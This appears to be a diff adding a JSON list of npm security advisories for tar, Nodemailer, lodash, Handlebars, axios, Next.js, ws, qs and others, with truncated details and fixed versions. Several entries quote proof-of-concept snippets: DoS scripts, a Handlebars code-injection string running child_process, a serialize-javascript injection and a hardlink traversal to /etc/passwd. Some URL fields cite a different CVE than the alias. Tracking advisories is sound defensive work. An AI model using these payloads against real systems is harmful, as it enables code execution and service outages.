@@ -1,0 +1,1984 @@
+[
+ {
+  "id": "GHSA-23hp-3jrh-7fpw",
+  "summary": "node-tar: Decompression/parse DoS via unlimited input",
+  "details": "### Summary\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2026-59873"
+  ],
+  "published": "2026-07-20T21:52:03Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59873",
+  "fixed": [
+   "tar@7.5.19"
+  ]
+ },
+ {
+  "id": "GHSA-268h-hp4c-crq3",
+  "summary": "Nodemailer: CRLF injection in Nodemailer List-* header comments allows arbitrary message header injection",
+  "details": "### Summary\n\nNodemailer constructs `List-*` headers from the caller-provided `list` message option using internally prepared header values. The `list.*.comment` field is inserted into those prepared values without removing CR (`\\r`) or LF (`\\n`) characters. Because prepared headers bypass the normal header-value sanitizer and are passed to `mimeFuncs.foldLines()`, a CRLF sequence in a list comment is emitted as an actual header boundary in the generated RFC822 message.\n\nAn application that lets a lower-privileged or unauthenticated user influence `list.help.comment`, `list.unsubscribe.comment`, `list.subscribe.comment`, `list.post.comment`, `list.owner.comment`, `list.archive.comment`, or `list.id.comment` can therefore be made to generate messages containing attacker-chosen additional headers.\n\n### Details\nSource-to-sink evidence:\n\n- `lib/mailer/mail-message.js:241-249` calls `_getListHeaders(this.data.list)` and adds each returned value with `this.message.addHeader(listHeader.key, value)`.\n- `lib/mailer/mail-message.js:253-296` builds each list header value as `{ prepared: true, foldLines: true, value: ... }`.\n- For `List-ID`, `lib/mailer/mail-message.js:272-279` copies `value.co",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-82661"
+  ],
+  "published": "2026-06-15T17:36:06Z",
+  "url": "https://osv.dev/vulnerability/GHSA-268h-hp4c-crq3",
+  "fixed": [
+   "nodemailer@8.0.9"
+  ]
+ },
+ {
+  "id": "GHSA-29mw-wpgm-hmr9",
+  "summary": "Regular Expression Denial of Service (ReDoS) in lodash",
+  "details": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require('lodash');\n\nfunction build_blank(n) {\n    var ret = \"1\"\n    for (var i = 0; i < n; i++) {\n        ret += \" \"\n    }\n    return ret + \"1\";\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\"time_cost0: \" + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\"time_cost1: \" + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\"time_cost2: \" + time_cost2);\n```",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2020-28500"
+  ],
+  "published": "2022-01-06T20:30:46Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28500",
+  "fixed": [
+   "lodash@4.17.21",
+   "lodash-es@4.17.21",
+   "lodash-rails@4.17.21"
+  ]
+ },
+ {
+  "id": "GHSA-2qvq-rjwj-gvw9",
+  "summary": "Handlebars.js has Prototype Pollution Leading to XSS through Partial Template Injection",
+  "details": "## Summary\n\n`resolvePartial()` in the Handlebars runtime resolves partial names via a plain property lookup on `options.partials` without guarding against prototype-chain traversal. When `Object.prototype` has been polluted with a string value whose key matches a partial reference in a template, the polluted string is used as the partial body and rendered **without HTML escaping**, resulting in reflected or stored XSS.\n\n## Description\n\nThe root cause is in `lib/handlebars/runtime.js` inside `resolvePartial()` and `invokePartial()`:\n\n```javascript\n// Vulnerable: plain bracket access traverses Object.prototype\npartial = options.partials[options.name];\n```\n\n`hasOwnProperty` is never checked, so if `Object.prototype` has been seeded with a key whose name matches a partial reference in the template (e.g. `widget`), the lookup succeeds and the polluted string is returned. The runtime emits a prototype-access warning, but the partial is still resolved and its content is inserted into the rendered output unescaped. This contradicts the documented security model and is distinct from CVE-2021-23369 and CVE-2021-23383, which addressed data property access rather than partial template resoluti",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-33916"
+  ],
+  "published": "2026-03-26T22:20:51Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23369",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-2w6w-674q-4c4q",
+  "summary": "Handlebars.js has JavaScript Injection via AST Type Confusion",
+  "details": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2026-33937"
+  ],
+  "published": "2026-03-27T18:19:58Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33937",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-2x7j-588g-ccc2",
+  "summary": "Nodemailer: Quadratic (O(n²)) time complexity in addressparser allows remote denial of service via a crafted address list",
+  "details": "### Summary\n\nNodemailer's address parser (`lib/addressparser/index.js`) parses a list of comma‑separated addresses in **quadratic time — O(n²)** in the number of addresses. A single crafted address string (e.g. a `To`, `Cc`, `Bcc`, `From`, or `Reply‑To` value, or any value passed to the exported `addressparser`) therefore consumes CPU proportional to the **square** of its length and blocks Node's single‑threaded event loop for the entire duration, denying service to every other request in the process.\n\nThis requires **no special application configuration and no cooperating receiver** — it is entirely inside the parser and triggers on the library's default code path. A ~1.5 MB address value freezes the process for ~25–30 seconds of 100% CPU; the cost grows with the square of the input, so a few‑MB value stalls the server for minutes. It is a distinct issue from the recursion DoS fixed as CVE‑2025‑14874 (that path is guarded by a nesting‑depth cap; this one is a flat, comma‑separated list with no such limit).\n\n### Details\n\n`addressparser` tokenizes the input, splits it into per‑address token groups, and then accumulates the parsed results in a loop (`lib/addressparser/index.js`, ~lin",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-92596"
+  ],
+  "published": "2026-09-08T21:33:17Z",
+  "url": "https://osv.dev/vulnerability/GHSA-2x7j-588g-ccc2",
+  "fixed": [
+   "nodemailer@9.1.0"
+  ]
+ },
+ {
+  "id": "GHSA-2xp9-vwfh-vxw4",
+  "summary": "Next.js: Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used",
+  "details": "A vulnerability in the underlying `libheif` library used by `sharp` which Next.js uses for image optimization can lead to remote code execution when AVIF files are optimized.\n\nUntil a fix has propagated, optimization of AVIF files is disabled.",
+  "severity": "CRITICAL",
+  "aliases": [],
+  "published": "2026-09-08T21:21:12Z",
+  "url": "https://osv.dev/vulnerability/GHSA-2xp9-vwfh-vxw4",
+  "fixed": [
+   "next@15.5.24",
+   "next@16.3.3"
+  ]
+ },
+ {
+  "id": "GHSA-34x7-hfp2-rc4v",
+  "summary": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+  "details": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-24842"
+  ],
+  "published": "2026-01-28T16:35:31Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24842",
+  "fixed": [
+   "tar@7.5.7"
+  ]
+ },
+ {
+  "id": "GHSA-35jh-r3h4-6jhm",
+  "summary": "Command Injection in lodash",
+  "details": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-23337"
+  ],
+  "published": "2021-05-06T16:05:51Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337",
+  "fixed": [
+   "lodash@4.17.21",
+   "lodash-es@4.17.21",
+   "lodash-rails@4.17.21"
+  ]
+ },
+ {
+  "id": "GHSA-37ch-88jc-xwx2",
+  "summary": "path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters",
+  "details": "### Impact\n\nA bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b-:c` or `/:a-:b-:c-:d`. The backtrack protection added in `path-to-regexp@0.1.12` only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.\n\n### Patches\n\nUpgrade to [path-to-regexp@0.1.13](https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13)\n\nCustom regex patterns in route definitions (e.g., `/:a-:b([^-/]+)-:c([^-/]+)`) are not affected because they override the default capture group.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b-:c` to `/:a-:b([^-/]+)-:c([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.\n\n### References\n\n- [GHSA-9wv6-86v2-598j](https://githu",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-45296",
+   "CVE-2026-4867",
+   "GHSA-9wv6-86v2-598j"
+  ],
+  "published": "2026-03-27T20:04:53Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4867",
+  "fixed": [
+   "path-to-regexp@0.1.13"
+  ]
+ },
+ {
+  "id": "GHSA-3g43-6gmg-66jw",
+  "summary": "axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge",
+  "details": "## Summary\n\nAxios versions before the fixed releases contain prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted `Object.prototype.transformResponse`, affected Axios versions may treat that inherited value as request configuration or as an option validator.\n\nAxios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over `Object.prototype` before Axios creates a request.\n\n## Impact\nFor ordinary prototype-pollution primitives that can only assign JSON-like values, this issue primarily results in request failures or denial-of-service attacks.\n\nIf the attacker can pollute `Object.prototype.transformResponse` with a function, affected versions of Axios may execute it. In fully affected versions, the function can observe response data and request config, including URL, headers, and `auth`, and can change the response data returned to application code.\n\nThis function-valued condition is important. Most query-string or JSON parser prototype-pollution bugs cannot create JavaScript functions on their own, so credent",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-44495"
+  ],
+  "published": "2026-05-29T16:07:31Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44495",
+  "fixed": [
+   "axios@1.15.2",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-3h5v-q93c-6h6q",
+  "summary": "ws affected by a DoS when handling a request with many HTTP headers",
+  "details": "### Impact\n\nA request with a number of headers exceeding the [`server.maxHeadersCount`][] threshold could be used to crash a ws server.\n\n### Proof of concept\n\n```js\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 0 }, function () {\n  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');\n  const headers = {};\n  let count = 0;\n\n  for (let i = 0; i < chars.length; i++) {\n    if (count === 2000) break;\n\n    for (let j = 0; j < chars.length; j++) {\n      const key = chars[i] + chars[j];\n      headers[key] = 'x';\n\n      if (++count === 2000) break;\n    }\n  }\n\n  headers.Connection = 'Upgrade';\n  headers.Upgrade = 'websocket';\n  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';\n  headers['Sec-WebSocket-Version'] = '13';\n\n  const request = http.request({\n    headers: headers,\n    host: '127.0.0.1',\n    port: wss.address().port\n  });\n\n  request.end();\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-37890"
+  ],
+  "published": "2024-06-17T19:09:10Z",
+  "url": "https://osv.dev/vulnerability/GHSA-3h5v-q93c-6h6q",
+  "fixed": [
+   "ws@5.2.4",
+   "ws@6.2.3",
+   "ws@7.5.10",
+   "ws@8.17.1"
+  ]
+ },
+ {
+  "id": "GHSA-3jfq-g458-7qm9",
+  "summary": "Arbitrary File Creation/Overwrite due to insufficient absolute path sanitization",
+  "details": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to prevent extraction of absolute file paths by turning absolute paths into relative paths when the `preservePaths` flag is not set to `true`. This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`. \n\nThis logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths. When given an absolute file path with repeating path roots, the resulting path (e.g. `///home/user/.bashrc`) would still resolve to an absolute path, thus allowing arbitrary file creation and overwrite. \n\n### Patches\n\n3.2.2 || 4.4.14 || 5.0.6 || 6.1.1\n\nNOTE: an adjacent issue [CVE-2021-32803](https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw) affects this release level. Please ensure you update to the latest patch levels that address CVE-2021-32803 as well if this adjacent issue affects your `node-tar` use case.\n\n### Workarounds\n\nUsers may work around this vulnerability wit",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-32804"
+  ],
+  "published": "2021-08-03T19:06:36Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32804",
+  "fixed": [
+   "tar@3.2.2",
+   "tar@4.4.14",
+   "tar@5.0.6",
+   "tar@6.1.1"
+  ]
+ },
+ {
+  "id": "GHSA-3mfm-83xf-c92r",
+  "summary": "Handlebars.js has JavaScript Injection via AST Type Confusion by tampering @partial-block",
+  "details": "## Summary\n\nThe `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.\n\n## Description\n\nHandlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.\n\nWhen `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.\n\nThe `handlebars-helpers` npm package (commonly use",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-33938"
+  ],
+  "published": "2026-03-27T18:20:44Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33938",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-3p68-rc4w-qgx5",
+  "summary": "Axios has a NO_PROXY Hostname Normalization Bypass that Leads to SSRF",
+  "details": "Axios does not correctly handle hostname normalization when checking `NO_PROXY` rules.\nRequests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip `NO_PROXY` matching and go through the configured proxy.\n\nThis goes against what developers expect and lets attackers force requests through a proxy, even if `NO_PROXY` is set up to protect loopback or internal services.\n\nAccording to [RFC 1034 §3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1) and [RFC 3986 §3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2), a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, `localhost.` is the same as `localhost`. \nHowever, Axios does a literal string comparison instead of normalizing hostnames before checking `NO_PROXY`. This causes requests like `http://localhost.:8080/` and `http://[::1]:8080/` to be incorrectly proxied.\n\nThis issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.\n\n---\n\n**PoC**\n\n```js\nimport http from \"http\";\nimport axios from \"axios\";\n\nc",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-62718"
+  ],
+  "published": "2026-04-09T17:32:19Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62718",
+  "fixed": [
+   "axios@1.15.0",
+   "axios@0.31.0"
+  ]
+ },
+ {
+  "id": "GHSA-3x4c-7xq6-9pq8",
+  "summary": "Next.js: Unbounded next/image disk cache growth can exhaust storage",
+  "details": "## Summary\nThe default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.\n\n## Impact\nAn attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. Note that this does not impact platforms that have their own image optimization capabilities, such as Vercel.\n\n## Patches\nFixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. \n\n## Workarounds\nIf upgrade is not immediately possible:\n- Periodically clean `.next/cache/images`.\n- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-27980"
+  ],
+  "published": "2026-03-17T16:17:06Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27980",
+  "fixed": [
+   "next@16.1.7",
+   "next@15.5.14"
+  ]
+ },
+ {
+  "id": "GHSA-4342-x723-ch2f",
+  "summary": "Next.js Improper Middleware Redirect Handling Leads to SSRF",
+  "details": "A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.\n\nAll users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-57822"
+  ],
+  "published": "2025-08-29T21:33:09Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57822",
+  "fixed": [
+   "next@14.2.32",
+   "next@15.4.7"
+  ]
+ },
+ {
+  "id": "GHSA-43fc-jf86-j433",
+  "summary": "Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig",
+  "details": "# Denial of Service via **proto** Key in mergeConfig\n\n### Summary\n\nThe `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError:",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-25639"
+  ],
+  "published": "2026-02-09T17:46:14Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25639",
+  "fixed": [
+   "axios@1.13.5",
+   "axios@0.30.3"
+  ]
+ },
+ {
+  "id": "GHSA-442j-39wm-28r2",
+  "summary": "Handlebars.js has a Property Access Validation Bypass in container.lookup",
+  "details": "## Summary\n\nIn `lib/handlebars/runtime.js`, the `container.lookup()` function uses `container.lookupProperty()` as a gate check to enforce prototype-access controls, but then discards the validated result and performs a second, unguarded property access (`depths[i][name]`). This Time-of-Check Time-of-Use (TOCTOU) pattern means the security check and the actual read are decoupled, and the raw access bypasses any sanitization that `lookupProperty` may perform.\n\nOnly relevant when the **compat** compile option is enabled (`{compat: true}`), which activates `depthedLookup` in `lib/handlebars/compiler/javascript-compiler.js`.\n\n## Description\n\nThe vulnerable code in `lib/handlebars/runtime.js` (lines 137–144):\n\n```javascript\nlookup: function (depths, name) {\n  const len = depths.length;\n  for (let i = 0; i < len; i++) {\n    let result = depths[i] && container.lookupProperty(depths[i], name);\n    if (result != null) {\n      return depths[i][name];  // BUG: should be `return result;`\n    }\n  }\n},\n```\n\n`container.lookupProperty()` (lines 119–136) enforces `hasOwnProperty` checks and `resultIsAllowed()` prototype-access controls. However, `container.lookup()` only uses `lookupProperty` as a ",
+  "severity": "LOW",
+  "aliases": [],
+  "published": "2026-03-29T15:16:37Z",
+  "url": "https://osv.dev/vulnerability/GHSA-442j-39wm-28r2",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-4mjr-xmp4-gh2g",
+  "summary": "qs: Denial of Service via Attacker Controlled isBuffer",
+  "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constru",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-82417"
+  ],
+  "published": "2026-09-02T14:45:13Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82417",
+  "fixed": [
+   "qs@6.16.0"
+  ]
+ },
+ {
+  "id": "GHSA-5955-9wpr-37jh",
+  "summary": "Arbitrary File Creation/Overwrite on Windows via insufficient relative path sanitization",
+  "details": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.\n\nThis logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\\path`.  If the drive letter does not match the extraction target, for example `D:\\extraction\\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.\n\nAdditionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.\n\nThis only affects users of `node-tar` o",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-37713"
+  ],
+  "published": "2021-08-31T16:05:05Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37713",
+  "fixed": [
+   "tar@4.4.18",
+   "tar@5.0.10",
+   "tar@6.1.9"
+  ]
+ },
+ {
+  "id": "GHSA-5c6j-r48x-rmvq",
+  "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+  "details": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(",
+  "severity": "HIGH",
+  "aliases": [],
+  "published": "2026-02-28T02:50:45Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7660",
+  "fixed": [
+   "serialize-javascript@7.0.3"
+  ]
+ },
+ {
+  "id": "GHSA-5c9x-8gcm-mpgx",
+  "summary": "Axios' HTTP adapter-streamed uploads bypass maxBodyLength when maxRedirects: 0",
+  "details": "### Summary\n\nFor stream request bodies, maxBodyLength is bypassed when maxRedirects is set to 0 (native http/https transport path). Oversized streamed uploads are sent fully even when the caller sets strict body limits.\n\n### Details\n\nRelevant flow in lib/adapters/http.js:\n  - 556-564: maxBodyLength check applies only to buffered/non-stream data.\n  - 681-682: maxRedirects === 0 selects native http/https transport.\n  - 694-699: options.maxBodyLength is set, but native transport does not enforce it.\n  - 925-945: stream is piped directly to socket (data.pipe(req)) with no Axios byte counting.\n\nThis creates a path-specific bypass for streamed uploads.\n\n  ### PoC\n\nEnvironment:\n\n  - Axios main at commit f7a4ee2\n  - Node v24.2.0\n\n  Steps:\n  1. Start an HTTP server that counts uploaded bytes and returns {received}.\n  2. Send a 2 MiB Readable stream with:\n      - adapter: 'http'\n      - maxBodyLength: 1024\n      - maxRedirects: 0\n\n  Observed:\n  - Request succeeds; server reports received: 2097152.\n\n  Control checks:\n  - Same stream with default/nonzero redirects: rejected with ERR_FR_MAX_BODY_LENGTH_EXCEEDED.\n  - Buffered body with maxRedirects: 0: rejected with ERR_BAD_REQUEST.\n\n  ### Impac",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-42034"
+  ],
+  "published": "2026-05-05T00:33:25Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42034",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-62hf-57xw-28j9",
+  "summary": "Axios: unbounded recursion in toFormData causes DoS via deeply nested request data",
